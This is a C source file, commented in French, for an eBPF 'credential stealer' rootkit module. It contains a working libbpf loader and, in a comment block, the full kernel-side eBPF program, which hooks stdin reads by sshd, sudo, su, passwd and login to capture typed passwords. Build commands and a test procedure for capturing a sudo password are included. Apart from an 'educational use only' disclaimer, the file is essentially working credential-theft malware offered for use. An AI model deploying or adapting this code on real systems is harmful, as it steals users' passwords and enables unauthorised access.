/**
 * Module L38 : eBPF Offensive - Credential Stealer
 *
 * Rootkit eBPF pour intercepter les credentials lors de l'authentification.
 * Cible: sshd, sudo, su, passwd
 *
 * AVERTISSEMENT: Ce code est à but éducatif uniquement.
 * L'utilisation non autorisée est illégale.
 *
 * ARCHITECTURE:
 * ┌─────────────────────────────────────────────────────────────┐
 * │                    CREDENTIAL STEALER                       │
 * ├─────────────────────────────────────────────────────────────┤
 * │                                                             │
 * │  USER SPACE                    KERNEL SPACE                │
 * │  ───────────                   ────────────                │
 * │                                                             │
 * │  ┌─────────────┐              ┌─────────────────┐          │
 * │  │   LOADER    │◄────────────│  RINGBUF MAP    │          │
 * │  │             │  events      │                 │          │
 * │  │  Reçoit et  │              └────────┬────────┘          │
 * │  │  affiche    │                       │                   │
 * │  │  credentials│                       │                   │
 * │  └─────────────┘              ┌────────┴────────┐          │
 * │                               │  eBPF PROGRAM   │          │
 * │                               │                 │          │
 * │                               │  sys_read hook  │          │
 * │                               │  (fd=0, stdin)  │          │
 * │                               └─────────────────┘          │
 * │                                                             │
 * └─────────────────────────────────────────────────────────────┘
 *
 * COMPILATION:
 *   # Programme eBPF (cred_stealer.bpf.c)
 *   clang -target bpf -D__TARGET_ARCH_x86 -g -O2 -c cred_stealer.bpf.c -o cred_stealer.bpf.o
 *
 *   # Loader userspace
 *   gcc -o cred_stealer example.c -lbpf -lelf -lz
 *
 * USAGE:
 *   sudo ./cred_stealer
 *
 * TEST:
 *   # Terminal 1: Lancer le stealer
 *   sudo ./cred_stealer
 *
 *   # Terminal 2: Tester avec sudo
 *   sudo ls
 *   # Le password tapé apparaîtra dans Terminal 1
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>
#include <time.h>
#include <sys/resource.h>
#include <linux/bpf.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>

/* ============================================
 * STRUCTURES
 * ============================================ */

/**
 * Structure des événements de credentials
 * DOIT correspondre à la structure dans le code BPF
 */
struct cred_event {
    __u32 pid;              /* Process ID */
    __u32 uid;              /* User ID */
    __u32 ppid;             /* Parent Process ID */
    char comm[16];          /* Nom du processus */
    char data[256];         /* Données lues (potential password) */
    __u32 data_len;         /* Longueur des données */
    __u64 timestamp;        /* Timestamp en nanosecondes */
};

/* ============================================
 * VARIABLES GLOBALES
 * ============================================ */

static volatile sig_atomic_t running = 1;
static FILE *log_file = NULL;

/* Handler pour arrêt propre */
static void sig_handler(int sig) {
    running = 0;
}

/* ============================================
 * FONCTIONS UTILITAIRES
 * ============================================ */

/**
 * get_timestamp - Obtenir un timestamp formaté
 */
static void get_timestamp(char *buf, size_t size) {
    time_t now = time(NULL);
    struct tm *tm_info = localtime(&now);
    strftime(buf, size, "%Y-%m-%d %H:%M:%S", tm_info);
}

/**
 * sanitize_data - Nettoyer les données pour l'affichage
 * Remplace les caractères non imprimables par des points
 */
static void sanitize_data(char *data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        if (data[i] == '\n' || data[i] == '\r') {
            data[i] = '\0';
            break;
        }
        if (data[i] < 32 || data[i] > 126) {
            data[i] = '.';
        }
    }
}

/**
 * print_banner - Affiche le banner du programme
 */
static void print_banner(void) {
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════╗\n");
    printf("║         eBPF Credential Stealer - Module L38                 ║\n");
    printf("║                                                               ║\n");
    printf("║   Intercepte les credentials via hook sys_read               ║\n");
    printf("║   Cibles: sshd, sudo, su, passwd, login                      ║\n");
    printf("║                                                               ║\n");
    printf("║   ⚠️  USAGE ÉDUCATIF UNIQUEMENT                               ║\n");
    printf("╚═══════════════════════════════════════════════════════════════╝\n");
    printf("\n");
}

/* ============================================
 * CALLBACK POUR LES ÉVÉNEMENTS
 * ============================================ */

/**
 * handle_event - Appelé pour chaque événement de credential capturé
 */
static int handle_event(void *ctx, void *data, size_t size) {
    struct cred_event *e = data;
    char timestamp[64];

    get_timestamp(timestamp, sizeof(timestamp));

    /* Sanitize les données pour l'affichage */
    char display_data[256];
    memcpy(display_data, e->data, sizeof(display_data));
    sanitize_data(display_data, e->data_len);

    /* Ignorer les lectures vides */
    if (e->data_len == 0 || display_data[0] == '\0')
        return 0;

    /* Afficher l'événement */
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════╗\n");
    printf("║  🔑 CREDENTIAL INTERCEPTÉ                                     ║\n");
    printf("╠═══════════════════════════════════════════════════════════════╣\n");
    printf("║  Timestamp: %-48s ║\n", timestamp);
    printf("║  Process:   %-48s ║\n", e->comm);
    printf("║  PID:       %-48d ║\n", e->pid);
    printf("║  PPID:      %-48d ║\n", e->ppid);
    printf("║  UID:       %-48d ║\n", e->uid);
    printf("╠═══════════════════════════════════════════════════════════════╣\n");
    printf("║  DATA:      %-48s ║\n", display_data);
    printf("╚═══════════════════════════════════════════════════════════════╝\n");

    /* Logger dans un fichier si ouvert */
    if (log_file) {
        fprintf(log_file, "[%s] %s (PID:%d UID:%d) : %s\n",
                timestamp, e->comm, e->pid, e->uid, display_data);
        fflush(log_file);
    }

    return 0;
}

/* ============================================
 * PROGRAMME BPF (code source séparé)
 * ============================================ */

/*
 * Le code BPF ci-dessous serait dans cred_stealer.bpf.c :
 *
 * =============================================================
 * // cred_stealer.bpf.c
 * #include <linux/bpf.h>
 * #include <bpf/bpf_helpers.h>
 * #include <bpf/bpf_tracing.h>
 * #include <bpf/bpf_core_read.h>
 *
 * char LICENSE[] SEC("license") = "GPL";
 *
 * struct cred_event {
 *     __u32 pid;
 *     __u32 uid;
 *     __u32 ppid;
 *     char comm[16];
 *     char data[256];
 *     __u32 data_len;
 *     __u64 timestamp;
 * };
 *
 * // Ring buffer pour les événements
 * struct {
 *     __uint(type, BPF_MAP_TYPE_RINGBUF);
 *     __uint(max_entries, 256 * 1024);
 * } events SEC(".maps");
 *
 * // Map pour stocker les buffers entre enter et exit
 * struct {
 *     __uint(type, BPF_MAP_TYPE_HASH);
 *     __uint(max_entries, 1024);
 *     __type(key, __u64);
 *     __type(value, __u64);
 * } pending_reads SEC(".maps");
 *
 * // Processus cibles
 * static __always_inline int is_target(char *comm) {
 *     // sshd
 *     if (comm[0] == 's' && comm[1] == 's' && comm[2] == 'h' && comm[3] == 'd')
 *         return 1;
 *     // sudo
 *     if (comm[0] == 's' && comm[1] == 'u' && comm[2] == 'd' && comm[3] == 'o')
 *         return 1;
 *     // su
 *     if (comm[0] == 's' && comm[1] == 'u' && comm[2] == '\0')
 *         return 1;
 *     // passwd
 *     if (comm[0] == 'p' && comm[1] == 'a' && comm[2] == 's' && comm[3] == 's')
 *         return 1;
 *     // login
 *     if (comm[0] == 'l' && comm[1] == 'o' && comm[2] == 'g' && comm[3] == 'i')
 *         return 1;
 *     return 0;
 * }
 *
 * SEC("tracepoint/syscalls/sys_enter_read")
 * int trace_read_enter(struct trace_event_raw_sys_enter* ctx) {
 *     int fd = (int)ctx->args[0];
 *     char *buf = (char *)ctx->args[1];
 *
 *     // Uniquement stdin (fd 0)
 *     if (fd != 0)
 *         return 0;
 *
 *     char comm[16];
 *     bpf_get_current_comm(&comm, sizeof(comm));
 *
 *     if (!is_target(comm))
 *         return 0;
 *
 *     __u64 pid_tgid = bpf_get_current_pid_tgid();
 *     __u64 buf_addr = (__u64)buf;
 *     bpf_map_update_elem(&pending_reads, &pid_tgid, &buf_addr, BPF_ANY);
 *
 *     return 0;
 * }
 *
 * SEC("tracepoint/syscalls/sys_exit_read")
 * int trace_read_exit(struct trace_event_raw_sys_exit* ctx) {
 *     __u64 pid_tgid = bpf_get_current_pid_tgid();
 *     __u64 *buf_addr;
 *     long ret = ctx->ret;
 *
 *     buf_addr = bpf_map_lookup_elem(&pending_reads, &pid_tgid);
 *     if (!buf_addr || ret <= 0) {
 *         bpf_map_delete_elem(&pending_reads, &pid_tgid);
 *         return 0;
 *     }
 *
 *     struct cred_event *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
 *     if (!e) {
 *         bpf_map_delete_elem(&pending_reads, &pid_tgid);
 *         return 0;
 *     }
 *
 *     e->pid = pid_tgid >> 32;
 *     e->uid = bpf_get_current_uid_gid() & 0xFFFFFFFF;
 *     e->timestamp = bpf_ktime_get_ns();
 *     bpf_get_current_comm(&e->comm, sizeof(e->comm));
 *
 *     // PPID
 *     struct task_struct *task = (struct task_struct *)bpf_get_current_task();
 *     bpf_probe_read_kernel(&e->ppid, sizeof(e->ppid), &task->real_parent->tgid);
 *
 *     // Lire le buffer
 *     __u32 len = ret;
 *     if (len > 255) len = 255;
 *     e->data_len = len;
 *     bpf_probe_read_user(&e->data, len, (void *)*buf_addr);
 *     e->data[len] = '\0';
 *
 *     bpf_ringbuf_submit(e, 0);
 *     bpf_map_delete_elem(&pending_reads, &pid_tgid);
 *
 *     return 0;
 * }
 * =============================================================
 */

/* ============================================
 * FONCTION PRINCIPALE
 * ============================================ */

/**
 * increase_rlimit - Augmente la limite de mémoire verrouillée
 */
static int increase_rlimit(void) {
    struct rlimit rlim = {
        .rlim_cur = RLIM_INFINITY,
        .rlim_max = RLIM_INFINITY,
    };
    return setrlimit(RLIMIT_MEMLOCK, &rlim);
}

int main(int argc, char **argv) {
    struct bpf_object *obj = NULL;
    struct bpf_program *prog_enter = NULL;
    struct bpf_program *prog_exit = NULL;
    struct bpf_link *link_enter = NULL;
    struct bpf_link *link_exit = NULL;
    struct ring_buffer *rb = NULL;
    int err;

    print_banner();

    /* Vérifier les privilèges */
    if (geteuid() != 0) {
        fprintf(stderr, "[!] Ce programme nécessite les privilèges root\n");
        fprintf(stderr, "    Exécutez avec: sudo %s\n", argv[0]);
        return 1;
    }

    /* Option: fichier de log */
    if (argc > 1 && strcmp(argv[1], "-o") == 0 && argc > 2) {
        log_file = fopen(argv[2], "a");
        if (!log_file) {
            fprintf(stderr, "[!] Impossible d'ouvrir le fichier de log: %s\n", argv[2]);
        } else {
            printf("[+] Logging vers: %s\n", argv[2]);
        }
    }

    /* Configurer les handlers de signaux */
    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    /* Augmenter les limites de mémoire */
    if (increase_rlimit()) {
        fprintf(stderr, "[!] Impossible d'augmenter RLIMIT_MEMLOCK: %s\n",
                strerror(errno));
        return 1;
    }

    printf("[*] Chargement du programme eBPF...\n");

    /* 1. Ouvrir le fichier objet BPF */
    obj = bpf_object__open_file("cred_stealer.bpf.o", NULL);
    if (libbpf_get_error(obj)) {
        fprintf(stderr, "[!] Erreur: impossible d'ouvrir cred_stealer.bpf.o\n");
        fprintf(stderr, "    Assurez-vous que le fichier existe.\n");
        fprintf(stderr, "    Compilez avec:\n");
        fprintf(stderr, "    clang -target bpf -D__TARGET_ARCH_x86 -g -O2 "
                        "-c cred_stealer.bpf.c -o cred_stealer.bpf.o\n");
        return 1;
    }

    /* 2. Charger dans le kernel */
    err = bpf_object__load(obj);
    if (err) {
        fprintf(stderr, "[!] Erreur: impossible de charger le programme: %s\n",
                strerror(-err));
        goto cleanup;
    }

    printf("[+] Programme BPF chargé\n");

    /* 3. Trouver les programmes */
    prog_enter = bpf_object__find_program_by_name(obj, "trace_read_enter");
    prog_exit = bpf_object__find_program_by_name(obj, "trace_read_exit");

    if (!prog_enter || !prog_exit) {
        fprintf(stderr, "[!] Programmes non trouvés dans l'objet BPF\n");
        goto cleanup;
    }

    /* 4. Attacher aux tracepoints */
    link_enter = bpf_program__attach(prog_enter);
    if (libbpf_get_error(link_enter)) {
        fprintf(stderr, "[!] Erreur: impossible d'attacher trace_read_enter\n");
        link_enter = NULL;
        goto cleanup;
    }

    link_exit = bpf_program__attach(prog_exit);
    if (libbpf_get_error(link_exit)) {
        fprintf(stderr, "[!] Erreur: impossible d'attacher trace_read_exit\n");
        link_exit = NULL;
        goto cleanup;
    }

    printf("[+] Programmes attachés aux tracepoints\n");

    /* 5. Configurer le ring buffer */
    int map_fd = bpf_object__find_map_fd_by_name(obj, "events");
    if (map_fd < 0) {
        fprintf(stderr, "[!] Map 'events' non trouvée\n");
        goto cleanup;
    }

    rb = ring_buffer__new(map_fd, handle_event, NULL, NULL);
    if (libbpf_get_error(rb)) {
        fprintf(stderr, "[!] Erreur: impossible de créer le ring buffer\n");
        rb = NULL;
        goto cleanup;
    }

    printf("[+] Ring buffer configuré\n");
    printf("\n");
    printf("[*] En attente de credentials... (Ctrl+C pour arrêter)\n");
    printf("[*] Cibles: sshd, sudo, su, passwd, login\n");
    printf("\n");

    /* 6. Boucle principale */
    while (running) {
        err = ring_buffer__poll(rb, 100);
        if (err < 0 && err != -EINTR) {
            fprintf(stderr, "[!] Erreur polling: %s\n", strerror(-err));
            break;
        }
    }

    printf("\n[*] Arrêt du credential stealer...\n");

cleanup:
    ring_buffer__free(rb);
    bpf_link__destroy(link_exit);
    bpf_link__destroy(link_enter);
    bpf_object__close(obj);

    if (log_file) {
        fclose(log_file);
    }

    printf("[*] Ressources libérées. Fin du programme.\n");

    return err != 0 ? 1 : 0;
}
